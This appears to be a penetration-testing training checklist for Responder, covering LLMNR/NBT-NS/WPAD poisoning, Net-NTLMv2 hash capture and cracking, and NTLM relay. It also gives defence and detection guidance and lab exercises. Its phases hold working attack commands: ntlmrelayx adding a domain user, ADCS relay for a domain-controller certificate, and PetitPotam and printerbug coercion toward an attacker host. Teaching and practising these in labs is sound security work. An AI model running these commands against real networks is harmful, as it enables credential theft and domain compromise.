# 📡 Responder: Complete Mastery Checklist

> **What is Responder?** Responder is a LLMNR, NBT-NS, and mDNS poisoner for Windows networks. When a Windows machine fails to resolve a hostname via DNS, it falls back to LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) — broadcasting a query on the local network. Responder answers all such queries, claiming to be the requested host. The requesting machine then authenticates to Responder using NTLMv1/NTLMv2, and Responder captures the hash. These Net-NTLMv2 hashes are then cracked offline or relayed for authentication.
>
> **Why does it exist?** LLMNR and NBT-NS are enabled by default on Windows and have no authentication — any machine on the network can answer a broadcast query. Responder exploits this fundamental design flaw to capture credentials from Windows machines that fail to resolve hostnames (e.g., a typo in a UNC path, a lost network share, a misconfigured startup script).
>
> **When to use it:** Internal network penetration tests (requires LAN access). Capturing NTLMv2 hashes for offline cracking. Combined with ntlmrelayx for pass-the-hash relay attacks. Wi-Fi penetration tests on corporate networks.
>
> **When to avoid it:** External engagements (requires LAN access). When you only need to listen without injecting (use pcap analysis instead). When SMB signing is enforced on all machines (relay attacks will fail, but hash capture still works).
>
> **What mastering Responder unlocks:** Credential capture from Windows environments without touching a single endpoint directly. NTLMv2 hash capture → cracking → domain user credentials. Foundation for NTLM relay attacks (ntlmrelayx). Fundamental AD attack technique present in nearly every internal pentest.

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals | 5 | 2–3 hours |
| 2 | Running Responder | 5 | 2–3 hours |
| 3 | Hash Capture and Cracking | 4 | 2–3 hours |
| 4 | NTLM Relay | 4 | 3–5 hours |
| 5 | Advanced Features | 3 | 2–3 hours |
| 6 | Detection and Defense | 3 | 1–2 hours |
| 7 | Practical Labs | 4 | 4–6 hours |
| 8 | Mastery Challenges | 3 | 3–5 hours |
| | **Total** | **31** | **~19–30 hours** |

**Prerequisites:** Active Directory and Windows networking basics (DNS, NTLM authentication, SMB). Understanding of NTLMv1/NTLMv2 vs. NTLM hashes (the difference matters for cracking). LAN access (physical or VPN connected to the internal network segment).

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — LLMNR and NBT-NS Explained

- [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **DNS Fallback Chain** | Windows: DNS query → if no answer → LLMNR broadcast (UDP 5355) → if no answer → NBT-NS broadcast (UDP 137). |
| **LLMNR** | Link-Local Multicast Name Resolution. Sends a multicast to the entire local network segment asking "Does anyone know the IP for HOSTNAME?". |
| **NBT-NS** | Older NetBIOS Name Service. Same concept, broadcasts on UDP 137. |
| **The Flaw** | No authentication in either protocol. Any machine that answers is trusted. Responder answers ALL queries, claiming to be every requested host. |
| **What Triggers It** | Typo in UNC path (`\\FILESRVR\share` instead of `\\FILESERVER\share`). Misconfigured login script. Lost DNS record for a service. User manually typing a non-existent hostname. |

---

### Task 1.2 — NTLM Authentication Flow

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Challenge-Response** | NTLM: server sends a challenge → client responds with HMAC-MD5(NT_hash, challenge+client_nonce). |
| **Net-NTLMv2** | The full challenge-response exchange captured by Responder. Format: `username::DOMAIN:challenge:response:blob`. This is what gets cracked. |
| **NTLMv2 vs. NT Hash** | NT hash (from SAM/NTDS): can be used for Pass-the-Hash. Net-NTLMv2 (from Responder): cannot be used for PtH directly — must crack offline to get the cleartext password, or relay the challenge-response. |
| **Relay** | ntlmrelayx relays the challenge-response in real time to authenticate to another server — without needing to crack the hash. |

---

### Task 1.3 — Installation

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Kali** | Pre-installed. `responder --version`. |
| **Manual** | `git clone https://github.com/lgandx/Responder`. |
| **Config** | `/usr/share/responder/Responder.conf` — configure which protocols to poison and which to serve credentials to. |

---

### Task 1.4 — Responder Config File

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Location** | `/usr/share/responder/Responder.conf`. |
| **Key Settings** | `SQL = On/Off` — fake MSSQL server. `SMB = On/Off` — fake SMB server. `HTTP = On/Off` — fake HTTP server. `HTTPS = On/Off`. `LDAP = On/Off`. Turn off services that conflict with your actual services or that you're relaying to (SMB off if running ntlmrelayx against SMB). |
| **Relay Mode** | Turn `SMB = Off` and `HTTP = Off` when running ntlmrelayx — Responder just poisons, ntlmrelayx handles the authentication. |

---

### Task 1.5 — Network Interface Selection

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Flag** | `-I eth0` — interface to listen on. Must be the interface connected to the target network. |
| **Multiple** | Can't listen on multiple interfaces simultaneously with one instance. Run two instances for different segments. |
| **Find Interface** | `ip a` — find the interface name connected to the target subnet. |

---

# PHASE 2: RUNNING RESPONDER

---

### Task 2.1 — Basic Passive Capture

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Command** | `sudo responder -I eth0 -v`. |
| **Wait** | Responder listens. When a Windows machine fires an LLMNR/NBT-NS query: Responder answers → captures the Net-NTLMv2 hash → displays it. |
| **Analysis Mode** | `-A` — analyze only, don't poison. Just listen and report what LLMNR/NBT-NS traffic you see. Useful for understanding the environment before going active. |

---

### Task 2.2 — Triggering Authentication

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Wait for Organic** | During business hours, authentication attempts happen organically from misconfigured clients. This is the safest approach (no noise). |
| **Force Trigger** | From a compromised host, run a UNC path to a non-existent server: `net use \\DOESNOTEXIST\share` → triggers LLMNR broadcast → Responder captures. |
| **Printer Exploit** | Any machine with network printer access: navigate to a printer's web admin → change spooler path to `\\attacker_ip\fake` → printer authenticates. Requires access to the printer admin. |

---

### Task 2.3 — Captured Hash Location

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Files** | `/usr/share/responder/logs/` — per-user hash files and the main `Responder.db` SQLite database. |
| **Format** | `NTLMv2-SSP-192.168.1.50.txt` — net-NTLMv2 hash from that IP. Format: `username::DOMAIN:challenge:response:blob`. |
| **Database** | `Responder.db` — SQLite database with all captures. `sqlite3 Responder.db "SELECT * FROM responder;"`. |

---

### Task 2.4 — Protocol-Specific Capture

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **SMB** | Default: fake SMB server captures NTLMv2. Most Windows authentication attempts. |
| **HTTP** | `-w` flag: `sudo responder -I eth0 -w` — enables WPAD (Web Proxy Auto-Discovery) poisoning. Captures HTTP authentication from browsers looking for proxy config. |
| **LDAP** | Captures LDAP authentication attempts (useful in environments with frequent LDAP queries). |
| **FTP/SMTP/POP3** | Responder can fake these servers too. Captures cleartext credentials from misconfigured clients. |

---

### Task 2.5 — WPAD Poisoning

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Concept** | Windows browsers look for a WPAD (Web Proxy Auto-Discovery) file at `http://wpad/wpad.dat`. They first resolve `wpad` via DNS/LLMNR. |
| **Attack** | Responder answers the WPAD hostname query → serves a malicious WPAD file → browser uses Responder as its proxy → Responder captures HTTP NTLM authentication. |
| **Enable** | `sudo responder -I eth0 -wP` (WPAD + force authentication). |
| **Impact** | Can capture hashes from all browser traffic on the local network. Highly effective. |

---

# PHASE 3: HASH CAPTURE AND CRACKING

---

### Task 3.1 — Cracking with Hashcat

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Format** | Mode 5600 = Net-NTLMv2. |
| **Command** | `hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`. |
| **Speed** | NTLMv2 is relatively fast to crack on GPU. Significantly faster than bcrypt. rockyou + best64 rules covers most simple corporate passwords. |

---

### Task 3.2 — Cracking with JtR

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Command** | `john --format=netntlmv2 --wordlist=rockyou.txt captured_hash.txt`. |
| **Rules** | `john --format=netntlmv2 --wordlist=rockyou.txt --rules=best64 hash.txt`. |

---

### Task 3.3 — Using Cracked Credentials

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Verify** | `crackmapexec smb target_ip -u cracked_user -p cracked_pass` — verify credentials work. |
| **Use** | `evil-winrm -i target_ip -u cracked_user -p cracked_pass` — WinRM shell. `impacket-psexec domain/user:pass@target_ip` — admin shell. `impacket-smbclient domain/user:pass@target_ip` — browse shares. |

---

### Task 3.4 — Multiple Hashes Strategy

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Multiple Captures** | Responder captures hashes from many users during the day. Crack all of them. |
| **Priority** | Service accounts (often simple passwords, high privileges). Domain admins. IT staff. Shared accounts. |
| **hashcat multiple** | `hashcat -m 5600 all_hashes.txt rockyou.txt --rules best64`. Cracks all at once. |

---

# PHASE 4: NTLM RELAY

---

### Task 4.1 — NTLM Relay Concept

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **What is Relay** | Instead of cracking the captured Net-NTLMv2 hash, relay it in real time to authenticate to another machine on the network. No cracking required — the hash is used as-is. |
| **Requirement** | Target machine must NOT have SMB signing enforced. `crackmapexec smb network_range --gen-relay-list targets.txt` — finds machines without SMB signing. |
| **Tool** | ntlmrelayx (part of Impacket). |

---

### Task 4.2 — Responder + ntlmrelayx Setup

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Step 1** | Edit `Responder.conf`: set `SMB = Off`, `HTTP = Off`. Responder poisons only — ntlmrelayx handles SMB/HTTP. |
| **Step 2** | Start ntlmrelayx: `impacket-ntlmrelayx -tf targets.txt -smb2support`. |
| **Step 3** | Start Responder: `sudo responder -I eth0`. |
| **What Happens** | Victim machine fires LLMNR query. Responder answers. Victim tries to authenticate. Responder passes the authentication attempt to ntlmrelayx. ntlmrelayx relays it to a target (from targets.txt). If the victim has admin on the target: shell or SAM dump. |

---

### Task 4.3 — ntlmrelayx Attacks

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **SAM Dump** | `ntlmrelayx -tf targets.txt -smb2support` — default: dumps SAM (local accounts) from the target. |
| **SOCKS Proxy** | `ntlmrelayx -tf targets.txt -smb2support -socks` — creates a SOCKS proxy using relayed sessions. Use with ProxyChains for any tool. |
| **Interactive Shell** | `ntlmrelayx -tf targets.txt -smb2support -i` — interactive SMB shell session. |
| **Execute Command** | `ntlmrelayx -tf targets.txt -smb2support -c "net user hacker P@ss123 /add /domain"` — run command as relayed user. |

---

### Task 4.4 — HTTP Relay (WebDAV/ADCS)

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **ADCS Relay (ESC8)** | Relay NTLM authentication to Active Directory Certificate Services HTTP enrollment endpoint. Requests a certificate for the victim user/computer. Use certificate for PKINIT authentication (Kerberos). |
| **Command** | `ntlmrelayx -t http://ca_server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`. |
| **Impact** | Certificate for DC machine account → pass-the-certificate → TGT → domain compromise. |

---

# PHASE 5: ADVANCED FEATURES

---

### Task 5.1 — IPv6 Poisoning

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **mitm6** | Separate tool for IPv6 MITM on Windows networks. Windows prefers IPv6 over IPv4 if available. mitm6 + ntlmrelayx is a powerful combo. |
| **Concept** | mitm6 responds to DHCPv6 requests → becomes the IPv6 DNS server for victims. Redirects DNS queries to attacker. Victim authenticates to attacker → relay with ntlmrelayx. |
| **Combined** | `sudo mitm6 -d target.domain` + `ntlmrelayx -6 -t ldaps://dc01 --delegate-access`. |

---

### Task 5.2 — Analyzing the Environment First

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Analyze Mode** | `sudo responder -I eth0 -A` — listen only, no poisoning. See what LLMNR/NBT-NS queries are being broadcast. Identify: which hostnames are being queried, which machines are querying, frequency. This intelligence guides the attack. |

---

### Task 5.3 — Coercion Techniques

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **PetitPotam** | Coerce Windows machines (including DCs) to authenticate to attacker via MS-EFSRPC. `PetitPotam.py attacker_ip target_ip`. Combined with ntlmrelayx → relay DC authentication to ADCS → DC certificate → domain compromise. |
| **PrinterBug** | `printerbug.py domain/user:pass@target_ip attacker_ip` — coerce a machine to authenticate via spooler service. |
| **Use** | These don't require Responder for coercion — they actively force authentication rather than waiting for organic broadcast traffic. |

---

# PHASE 6: DETECTION AND DEFENSE

---

### Task 6.1 — Defending Against Responder

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Disable LLMNR** | GPO: Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution → Enabled. |
| **Disable NBT-NS** | Network adapter properties → IPv4 → Advanced → WINS → Disable NetBIOS over TCP/IP. Or via GPO registry key. |
| **Enable SMB Signing** | Require SMB signing on all domain members — defeats relay attacks. GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Microsoft network server: Digitally sign communications. |

---

### Task 6.2 — Detection

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **SIEM Rules** | Alert on: a single machine answering many different LLMNR queries. NTLM authentication failures at unusual frequency. Machines authenticating to non-standard servers. |
| **Network Monitoring** | Wireshark/SIEM: LLMNR responses from unexpected sources. NBT-NS responses from non-Windows-DNS servers. Multiple authentication failures from one source. |

---

### Task 6.3 — LLMNR Poisoning IOCs

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **IOCs** | UDP 5355 (LLMNR) responses from non-authorized sources. UDP 137 (NBT-NS) responses from non-authorized sources. Net-NTLMv2 authentication attempts to unknown IPs. |

---

# PHASE 7: PRACTICAL LABS

---

### Lab 7.1 — Hash Capture in AD Lab

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | Run Responder on Kali in an AD lab network. From a Windows VM, type a non-existent UNC path (`\\nonexistent\share`). Verify hash capture in Responder output and log files. |
| **Success Criteria** | Net-NTLMv2 hash captured. Hash format verified. Hash file saved. |

---

### Lab 7.2 — Crack and Use Captured Hash

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | From Lab 7.1, crack the captured Net-NTLMv2 hash with Hashcat (mode 5600) + rockyou.txt. Use the cracked credentials to authenticate to the target via CrackMapExec. |
| **Success Criteria** | Hash cracked. Credentials verified via CME. |

---

### Lab 7.3 — NTLM Relay Attack

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| **Scenario** | AD lab with at least 2 Windows machines. One machine without SMB signing. Configure Responder (SMB=Off) + ntlmrelayx targeting the unsigned machine. Trigger authentication from another Windows VM. Achieve SAM dump via relay. |
| **Success Criteria** | Relay successful. SAM dump received. Local hashes extracted. |

---

### Lab 7.4 — PetitPotam + ADCS Relay

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 60 min

| **Scenario** | AD lab with ADCS installed. Use PetitPotam to coerce DC authentication. Relay to ADCS web enrollment. Obtain DC machine certificate. Use certificate for Kerberos authentication. Achieve domain admin. |
| **Success Criteria** | DC certificate obtained. Domain admin TGT acquired. |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Organic Hash Capture

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 60 min

| **Scenario** | Run Responder passively (-A mode) in the lab for 30 minutes. Identify what hostnames are queried. Predict what machines will authenticate if you poison. Run active Responder. Capture and crack. |
| **Success Criteria** | Passive analysis completed. Prediction correct. Hash captured and cracked. |

---

### Challenge 8.2 — Full AD Compromise via Relay

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 90 min

| **Scenario** | Starting with only Kali on the internal network (no credentials): use Responder + relay to gain initial foothold credentials. Use credentials for further enumeration. Escalate to domain admin. |
| **Success Criteria** | Domain admin achieved starting from zero credentials. Full attack chain documented. |

---

### Challenge 8.3 — Write Detection Rules

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 60 min

| **Scenario** | After running Responder in a lab, write Sigma or Splunk detection rules that would catch the attack. Test the rules against logs generated during the lab. Verify the rules fire on Responder activity but not on normal traffic. |
| **Success Criteria** | Detection rules written. True positive rate 100%. False positive rate 0% on normal traffic sample. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can explain LLMNR/NBT-NS and why they're vulnerable | ☐ |
| Can run Responder and capture Net-NTLMv2 hashes | ☐ |
| Can crack captured hashes with Hashcat and JtR | ☐ |
| Can configure Responder for relay mode (SMB/HTTP off) | ☐ |
| Can run a basic SMB relay attack with ntlmrelayx | ☐ |
| Can use WPAD poisoning to capture browser credentials | ☐ |
| Understands the difference between Net-NTLMv2 and NT hash | ☐ |
| Can use PetitPotam/PrinterBug for coerced authentication | ☐ |
| Knows how to disable LLMNR/NBT-NS for defense | ☐ |
| Can write detection rules for Responder-style attacks | ☐ |

---

## 🎯 Interview Questions

1. What is LLMNR and why is it vulnerable to poisoning attacks?
2. What is the difference between Net-NTLMv2 and an NT hash?
3. Can you use a Net-NTLMv2 hash for Pass-the-Hash? Why or why not?
4. How do you configure Responder and ntlmrelayx for a relay attack?
5. What is the requirement for NTLM relay to succeed?
6. How does WPAD poisoning work and what does it capture?
7. What GPO settings disable LLMNR and NBT-NS?
8. What is PetitPotam and how does it complement Responder?
9. How do you detect Responder-style attacks in a network?
10. Why does enabling SMB signing on all machines defeat relay attacks?
